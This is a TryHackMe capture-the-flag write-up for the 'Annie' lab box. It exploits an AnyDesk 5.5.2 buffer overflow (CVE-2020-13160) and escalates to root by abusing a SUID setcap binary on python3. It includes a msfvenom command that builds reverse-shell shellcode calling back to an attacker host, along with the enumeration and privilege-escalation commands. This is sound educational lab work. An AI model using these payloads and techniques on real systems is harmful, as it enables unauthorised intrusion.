---
title: "Annie TryHackMe" 
date: 2025-12-23 22:30:00 0000+
tags: [WriteUp, Annie, THM,  Enumeration, CVE-2020-13160, setcap, python3, Privilege Escalation, SUID, BufferOverflow, Linux]
categories: [WriteUps, TryHackMe]
image:
  path: /assets/images/Annie_THM/Annie.png
---
# Annie TryHackMe Writeup

Annie is a medium box from Tryhackme which focusses on a CVE found in the AnyDesk Client version 5.5.2 which is a buffer overflow vulnerability which lets us get on the box and claim our first flag. For the privilege escalation part we found that a binary has an SUID bit set which can set SUID on other files abusing this privilege on the python3 binary we get a system or root shell allowing us to pwn this box.

![Annie.png](/assets/images/Annie_THM/Annie.png)

## Initial Enumeration

We start off with nmap to find the open ports and services running on the box.

```bash
rustmap.py -ip 10.48.148.190
```

![image.png](/assets/images/Annie_THM/image.png)

![image.png](/assets/images/Annie_THM/image%201.png)

Results show that we have 3 ports open on the box one being SSH, and one (7070) is running AnyDesk Client, and lastly we have 45557 which is unknown as per nmap.

### Web Enumeration

Visiting it in browser gives us this page.

![image.png](/assets/images/Annie_THM/image%202.png)

Tried other ports too but they are also unreachable.

## Exploitation

### Buffer Overflow in Anydesk

We know that on port 7070 AnyDesk Client is running lets search some cveâ€™s for this on cvedetails.com

![image.png](/assets/images/Annie_THM/image%203.png)

Found this vulnerbility which was discovered in 2020, its an RCE which is found in AnyDesk 5.5.3

Found this repo on github with the exploit code.

[https://github.com/josephalan42/Exploits/blob/main/AnyDesk 5.5.2 - Remote Code Execution](https://github.com/josephalan42/Exploits/blob/main/AnyDesk%205.5.2%20-%20Remote%20Code%20Execution)

After going through the exploit code, we first need to generate a shell code to be able to recieve a shell on our box.

We are gonna be using msfvenom to generate a shell code.

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.149.131 LPORT=9002 -b "\x00\x25\x26" -f python -v shellcode
```

![image.png](/assets/images/Annie_THM/image%204.png)

We ll replace this shellcode in our exploit.

The final exploit looks like this

![image.png](/assets/images/Annie_THM/image%205.png)

Now lets start a listener on port 9002 and run this python exploit.

### Shell as Annie

![image.png](/assets/images/Annie_THM/image%206.png)

We are in!!

We have a shell as Annie on the box.

NOTE - Anydesk runs on port 50001 UDP for the screen sharing purposes, checking for the UDP port being open using nmap gives us this.

![image.png](/assets/images/Annie_THM/image%207.png)

Lets now stabilize our shell.

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
stty size
stty raw -echo;fg
stty rows 120 cols 120
```

![image.png](/assets/images/Annie_THM/image%208.png)

Claiming user.txt

![image.png](/assets/images/Annie_THM/image%209.png)

## Privilege Escalation

### Shell as Root

Looking at the files which can be ran as root.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![image.png](/assets/images/Annie_THM/image%2010.png)

We have SUID bit set on /sbin/setcap.

We can use python to exploit it.

In the python capabilities we have this from GTFO

![image.png](/assets/images/Annie_THM/image%2011.png)

Lets use this setcap binary to setuid on python3

First we will copy the python3 to a tmp directory and then use setcap to set a setuid bit on the binary.

Then we will execute the fake python binary.

![image.png](/assets/images/Annie_THM/image%2012.png)

Now we are root on the box.

Lets grab the root.txt flag.

Rooted!!

![image.png](/assets/images/Annie_THM/image%2013.png)

Thanks for reading ğŸ™‚âœŒï¸
